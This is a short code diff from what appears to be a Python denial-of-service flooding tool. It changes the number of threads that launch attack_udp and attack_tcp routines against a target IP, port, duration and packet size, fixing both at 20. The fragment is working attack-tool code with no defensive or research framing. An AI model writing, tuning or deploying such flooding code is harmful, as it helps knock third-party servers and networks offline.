@@ -131,7 +131,7 @@ def main():
                     duration = int(args[3])
                     end_time = time.time() + duration
                     size = int(args[4])
-                    threads = 50
+                    threads = 20
 
                     for _ in range(threads):
                         threading.Thread(target=attack_udp, args=(ip, port, end_time, size), daemon=True).start()
@@ -141,7 +141,7 @@ def main():
                     duration = int(args[3])
                     end_time = time.time() + duration
                     size = int(args[4])
-                    threads = int(args[5])
+                    threads = 20
 
                     for _ in range(threads):
                         threading.Thread(target=attack_tcp, args=(ip, port, end_time, size), daemon=True).start()
